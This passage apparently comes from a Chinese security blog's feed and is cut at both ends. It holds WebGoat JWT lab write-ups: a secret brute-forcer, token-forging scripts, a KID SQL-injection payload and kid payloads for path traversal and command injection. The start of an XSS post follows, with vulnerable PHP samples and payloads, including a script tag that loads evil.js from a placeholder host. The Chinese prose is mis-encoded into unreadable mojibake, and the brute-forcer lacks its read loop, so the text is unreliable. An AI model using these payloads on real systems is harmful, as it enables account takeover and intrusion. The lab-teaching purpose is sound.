å­—ç¬¦ä¸²æ ¼å¼é”™è¯¯ï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œæ ¹æœ¬æ— æ³•éªŒè¯å½“å‰ key_ æ˜¯å¦æœ‰æ•ˆã€‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment">#import termcolor</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># æç¤ºé‡Œç»™çš„å­—å…¸https://github.com/first20hours/google-10000-english</span></span><br><span class="line">dict_path = <span class="string">&#x27;path/10000_en_words.txt&#x27;</span></span><br><span class="line">JWT_STR = <span class="string">R&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.m-jSyfYEsVzD3CBI6N39wZ7AcdKdp_GiO7F_Ym12u-0&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = JWT_STR</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dict_path) <span class="keyword">as</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="comment">#print(&#x27;\r&#x27;, &#x27;\bbingo! found key --&gt;&#x27;, termcolor.colored(key_, &#x27;green&#x27;), &#x27;&lt;--&#x27;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;the key is [&#x27;</span>,key_,<span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! no key be found.&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607191917485.png" alt="image-20230607191917485"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">  <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686136171</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1786136231</span>,   <span class="comment"># ä¿®æ”¹jwtåˆ°æœŸæ—¶é—´</span></span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;WebGoat&quot;</span>, <span class="comment"># æŒ‰é¢˜ç›®è¦æ±‚ä¿®æ”¹åå­—</span></span><br><span class="line">  <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;tom@webgoat.org&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Role&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;Manager&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Project Administrator&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;HS256&quot;</span>,key=<span class="string">&quot;available&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„tokenæäº¤å³å¯</p><p><img src="/../images/image-20230607192326261.png" alt="image-20230607192326261"></p><h3 id="è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ"><a href="#è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ" class="headerlink" title="è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ"></a>è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œ</h3><h4 id="å½¢æˆåŸå› -1"><a href="#å½¢æˆåŸå› -1" class="headerlink" title="å½¢æˆåŸå› "></a><strong>å½¢æˆåŸå› </strong></h4><p>æœªæ ¡éªŒaccess tokenå’Œrefresh tokenæ˜¯å¦å±äºåŒä¸€ä¸ªç”¨æˆ·ï¼Œå¯¼è‡´Aç”¨æˆ·å¯ä½¿ç”¨è‡ªå·±çš„refresh tokenå»åˆ·æ–°Bç”¨æˆ·çš„access token</p><h4 id="å®éªŒ-1"><a href="#å®éªŒ-1" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h4><p>WebGoat JWT 12</p><p>é¢˜ç›®ç»™å‡ºäº†Tomçš„æ—§token</p><p><img src="/../images/image-20230608205636773.png" alt="image-20230608205636773"></p><p>ç”¨jerryè®¿é—®å¾—åˆ°refresh tokenï¼ˆå¯†ç åœ¨æºç é‡Œï¼‰</p><p><img src="/../images/image-20230608205424807.png" alt="image-20230608205424807"></p><p>ç”¨jerryçš„refresh token å»åˆ·æ–°Tomçš„access token</p><p><img src="/../images/image-20230608210421439.png" alt="image-20230608210421439"></p><p>å¸¦ä¸Šå¾—åˆ°çš„accesstokenï¼Œå»è´­ç‰©</p><p><img src="/../images/image-20230608210205494.png" alt="image-20230608210205494"></p><h4 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a><strong>ä¿®å¤</strong></h4><p>è·Ÿè¸ªå“ªä¸ªaccess tokenå±äºå“ªä¸ªrefresh token,è¿˜å¯ä»¥æ£€æŸ¥ç”¨æˆ·çš„IPåœ°å€æˆ–åœ°ç†ä½ç½®ã€‚</p><h3 id="æ—§JWTå¤ç”¨"><a href="#æ—§JWTå¤ç”¨" class="headerlink" title="æ—§JWTå¤ç”¨"></a>æ—§JWTå¤ç”¨</h3><p>è¿˜æ˜¯WebGoat JWT 12</p><p><img src="/../images/image-20230607193350002.png" alt="image-20230607193350002"></p><p><img src="/../images/image-20230607193221271.png" alt="image-20230607193221271"></p><h3 id="KIDæ³¨å…¥"><a href="#KIDæ³¨å…¥" class="headerlink" title="KIDæ³¨å…¥"></a>KIDæ³¨å…¥</h3><p>WebGoat JWT 13</p><p>æŸ¥çœ‹å¯¹åº”æºç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span>Jwts.parser().setSigningKeyResolver(<span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">                        xxxxxxx</span><br><span class="line">                    &#125;).parseClaimsJws(token);</span><br><span class="line"><span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Jerry&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-jerry-account&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Tom&quot;</span>.equals(username)) &#123;</span><br><span class="line">    <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-final-not-tom&quot;</span>).build();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ï¼šè·å–å¯†é’¥ï¼Œç„¶åè§£ætokenï¼Œè·å¾—claimsä¸­çš„usernameï¼Œå¦‚æœä¸ºTomåˆ™åˆ é™¤æˆåŠŸã€‚</p><p><strong>å…³é”®</strong>ï¼šè·å–å¯†é’¥çš„éƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">SigningKeyResolverAdapter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] resolveSigningKeyBytes(JwsHeader header, Claims claims) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">kid</span> <span class="operator">=</span> (String) header.get(<span class="string">&quot;kid&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// é€šè¿‡æŸ¥è¯¢kidæ¥è·å¾—keyï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨sqlæ³¨å…¥</span></span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span>connection.createStatement().executeQuery(<span class="string">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">      </span><br><span class="line">            <span class="keyword">while</span> (rs.next()) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// è¿”å›base64è§£ç åçš„key</span></span><br><span class="line">            <span class="keyword">return</span> TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">catch</span> (SQLException e) </span><br><span class="line">        &#123;</span><br><span class="line">            errorMessage[<span class="number">0</span>] = e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¸¸çš„æ€è·¯æ˜¯é€šè¿‡å¯¹kidå‚æ•°è¿›è¡Œsqlæ³¨å…¥ï¼Œä¼ªé€ key</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> key <span class="keyword">FROM</span> jwt_keys <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;&quot; + kid + &quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºTomçš„jwtä¸­kidä¸º<code>webgoat_key</code>ï¼Œè¯´æ˜åœ¨jwt_keysè¡¨ä¸­æœ‰ä¸€ä¸ªidçš„å€¼ä¸º<code>webgoat_key</code>ã€‚</p><p>æ‰€ä»¥å¯ä»¥å¯¹kidæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kid: y<span class="string">&#x27; and 1=2 union select id from jwt_keys where id =&#x27;</span>webgoat_key</span><br></pre></td></tr></table></figure><p>è¿™æ ·sqlæŸ¥è¯¢çš„ç»“æœå°±ä¸º<code>webgoat_key</code>ï¼Œå³keyä¸º<code>webgoat_key</code>ï¼Œä½†æ˜¯å› ä¸º</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TextCodec.BASE64.decode(rs.getString(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>æ— æ³•å¯¹<code>webgoat_key</code>è¿›è¡Œbase64è§£ç ï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><p>ç”¨<code>webgoat_key</code>ä½œä¸ºkey</p><p><img src="/../images/image-20230608204646391.png" alt="image-20230608204646391"></p><p>é€šè¿‡æºç å¾—åˆ°çœŸæ­£çš„keyä¸º</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">token_dict = &#123;</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1529569536</span>,</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;WebGoat Token Builder&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">2018905304</span>,</span><br><span class="line">    <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;webgoat.org&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Email&quot;</span>: <span class="string">&quot;jerry@webgoat.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Role&quot;</span>: [<span class="string">&quot;Cat&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">key = base64.b64decode(<span class="string">&quot;qwertyqwerty1234&quot;</span>)</span><br><span class="line"><span class="comment"># headers</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;kid&quot;: &quot;123&#x27; and 1=2 union select id FROM jwt_keys WHERE id=&#x27;webgoat_key&quot;,</span></span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;webgoat_key&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># è°ƒç”¨jwtåº“,ç”Ÿæˆjson web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=token_dict,  <span class="comment"># payload, æœ‰æ•ˆè½½ä½“</span></span><br><span class="line">                       key=key,  <span class="comment"># è¿›è¡ŒåŠ å¯†ç­¾åçš„å¯†é’¥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># æŒ‡æ˜ç­¾åç®—æ³•æ–¹å¼, é»˜è®¤ä¹Ÿæ˜¯HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token æ•°æ®ç»“æ„åŒ…å«ä¸¤éƒ¨åˆ†, payload(æœ‰æ•ˆè½½ä½“), headers(æ ‡å¤´)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 ç¼–ç åå¾—åˆ° bytes, å†è¿›è¡Œè§£ç (æŒ‡æ˜è§£ç çš„æ ¼å¼), å¾—åˆ°ä¸€ä¸ªstr</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608204947847.png" alt="image-20230608204947847"></p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>é€‰æ‹©å“ªç§æ–¹æ³•ï¼Œå–å†³äºåç«¯æ˜¯å¦‚ä½•åˆ©ç”¨kidæ¥æ‰¾åˆ°å¯¹åº”å¯†é’¥</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#ç›®å½•éå†</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">#sqlæ³¨å…¥</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;-- &quot;</span></span><br><span class="line">#å‘½ä»¤æ‰§è¡Œ</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span> : <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span> : <span class="string">&quot;jwt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span> : <span class="string">&quot;/path/to/key_file|whoami&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç­¾åç®—æ³•æ›´æ”¹ä¸ºå¯¹ç§°åŠ å¯†"><a href="#ç­¾åç®—æ³•æ›´æ”¹ä¸ºå¯¹ç§°åŠ å¯†" class="headerlink" title="ç­¾åç®—æ³•æ›´æ”¹ä¸ºå¯¹ç§°åŠ å¯†"></a>ç­¾åç®—æ³•æ›´æ”¹ä¸ºå¯¹ç§°åŠ å¯†</h3><p>JWTä¸­æœ€å¸¸ç”¨çš„ä¸¤ç§ç®—æ³•ä¸º<code>HMAC</code>å’Œ<code>RSA</code></p><blockquote><p>HMAC(HS256):æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç§˜å¯†å¯†é’¥å¯¹æ¯æ¡æ¶ˆæ¯è¿›è¡Œç­¾åå’ŒéªŒè¯<br>RSA(RS256)ï¼šæ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç§é’¥åŠ å¯†æ˜æ–‡ï¼Œå…¬é’¥è§£å¯†å¯†æ–‡ã€‚</p></blockquote><p>å¦‚æœå¯¹æ–¹ç½‘ç«™åŸæ¥ä½¿ç”¨çš„æ˜¯RS256ï¼Œä½†æ˜¯æ³„éœ²äº†å…¬é’¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥å…¬é’¥ç”Ÿæˆç­¾åï¼Œå¹¶ä¸”å°†algçš„å€¼æ”¹ä¸ºHS256ï¼Œå› ä¸ºHS256ä¸ºå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œæ‰€ä»¥ç½‘ç«™å°±ä¼šä½¿ç”¨è¯¥å…¬é’¥éªŒè¯ç­¾åï¼Œè‡ªç„¶ç­¾åå¯ä»¥é€šè¿‡éªŒè¯ã€‚</p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://jwt.io/introduction">https://jwt.io/introduction</a></p><p><a href="http://www.xianxianlabs.com/blog/2018/06/03/96.html">http://www.xianxianlabs.com/blog/2018/06/03/96.html</a></p><p><a href="https://www.freebuf.com/vuls/216457.html">https://www.freebuf.com/vuls/216457.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2023/06/01/XSS/"/>
      <url>/2023/06/01/XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸»è¦åœ¨ <a href="https://xz.aliyun.com/t/9606">https://xz.aliyun.com/t/9606</a> åŸºç¡€ä¸Šè¿›è¡Œå­¦ä¹ </p><h1 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h1><p> <strong>è·¨ç«™è„šæœ¬</strong>ï¼ˆè‹±è¯­ï¼šCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºï¼šXSSï¼‰æ˜¯ä¸€ç§ç½‘ç«™åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´æ”»å‡»ã€‚è¿™ç±»æ¼æ´èƒ½å¤Ÿä½¿å¾—æ”»å‡»è€…åµŒå…¥æ¶æ„è„šæœ¬ä»£ç åˆ°æ­£å¸¸ç”¨æˆ·ä¼šè®¿é—®åˆ°çš„é¡µé¢ä¸­ï¼Œå½“æ­£å¸¸ç”¨æˆ·è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œåˆ™å¯å¯¼è‡´åµŒå…¥çš„æ¶æ„è„šæœ¬ä»£ç çš„æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚</p><h1 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h1><p><img src="/../images/image-20230524205745342-1686840019396.png" alt="image-20230524205745342"></p><ul><li><p>åå°„å‹</p><p>ç”¨æˆ·è¾“å…¥ä»€ä¹ˆç½‘ç«™è¿”å›ä»€ä¹ˆï¼Œæ¼æ´æˆå‹ç‚¹åœ¨æœåŠ¡å™¨ç«¯ä»£ç è§£æå¼•æ“</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°htmlä¸­</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¸¸è§åœºæ™¯ï¼šæœç´¢åŠŸèƒ½ç­‰å°†è¾“å…¥ç›´æ¥å›æ˜¾çš„åœºæ™¯ï¼Œé€šå¸¸éœ€è¦è¯±å¯¼å—å®³è€…ç‚¹å‡»æ‰èƒ½å®ç°æ”»å‡»ã€‚</p></li><li><p>å­˜å‚¨å‹</p><p>ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šå…ˆå­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œåªè¦æŸ¥è¯¢åˆ°æ•°æ®åº“ä¸­çš„è„æ•°æ®ï¼Œè¿™äº›æ•°æ®å›æ˜¾åˆ°é¡µé¢å°±ä¼šè§¦å‘XSSï¼Œæ¼æ´æˆå‹ç‚¹åœ¨<strong>æ•°æ®åº“</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// è·å–ç”¨æˆ·è¾“å…¥</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é˜²å¾¡sqlæ³¨å…¥ï¼ˆä¹Ÿä¸å…¨ï¼Œ$nameå˜é‡æ²¡æœ‰è¿‡æ»¤ï¼‰</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>( <span class="variable">$message</span> );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ²¡æœ‰è€ƒè™‘åˆ°å¯¹ XSS è¿›è¡Œè¿‡æ»¤,å°†xssæ•°æ®å­˜å…¥æ•°æ®åº“ä¸­</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="comment">// æŸ¥è¯¢ï¼Œæ‹¼æ¥ï¼Œè§¦å‘xss</span></span><br><span class="line">    xxxxï¼›</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¸¸è§åœºæ™¯ï¼šè¯„è®ºï¼Œè®¢å•ï¼Œå¯ä»¥å‚è€ƒsqlä¸­çš„äºŒæ¬¡æ³¨å…¥</p></li><li><p>DOMå‹</p><p>ä¸æœåŠ¡å™¨æ— äº¤äº’ï¼Œæ¼æ´æˆå‹ç‚¹åœ¨**<code>javascript</code>æ–‡ä»¶è§£æç”¨æˆ·è¾“å…¥æ—¶**ï¼Œè§¦å‘ç‚¹åœ¨å®¢æˆ·ç«¯æ¸²æŸ“DOMæ—¶ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  lang å˜é‡é€šè¿‡ document.location.hrefï¼ˆå½“å‰é¡µé¢çš„ URLï¼‰æ¥è·å–</span></span><br><span class="line"><span class="keyword">var</span> lang = document.location.href.<span class="title function_ invoke__">substring</span>(document.location.href.<span class="title function_ invoke__">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤å°±ç›´æ¥ URL è§£ç åè¾“å‡ºåœ¨äº† option æ ‡ç­¾ä¸­</span></span><br><span class="line">document.<span class="title function_ invoke__">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="variable">$decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¸¸è§åœºæ™¯ï¼šéœ€è¦å®¡è®¡<code>javascript</code>ä»£ç </p></li></ul><h1 id="å¦‚ä½•æ‰§è¡Œjavascript"><a href="#å¦‚ä½•æ‰§è¡Œjavascript" class="headerlink" title="å¦‚ä½•æ‰§è¡Œjavascript"></a>å¦‚ä½•æ‰§è¡Œjavascript</h1><ul><li>scriptæ ‡ç­¾</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>éscriptæ ‡ç­¾</p><ul><li><p><code>on</code>äº‹ä»¶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;&#x27;</span> onclick=<span class="string">&#x27;alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/jsref/dom-obj-event.html">HTML DOM äº‹ä»¶å¯¹è±¡ | èœé¸Ÿæ•™ç¨‹</a></p></li><li><p><code>javascript:</code>  </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1);</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;img src=javascript:alert(1)&gt;    //IE7ä»¥ä¸‹</span><br><span class="line">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>script</code>æ ‡ç­¾çš„srcå±æ€§</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://xxx/evil.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h1 id="ç»•è¿‡å§¿åŠ¿"><a 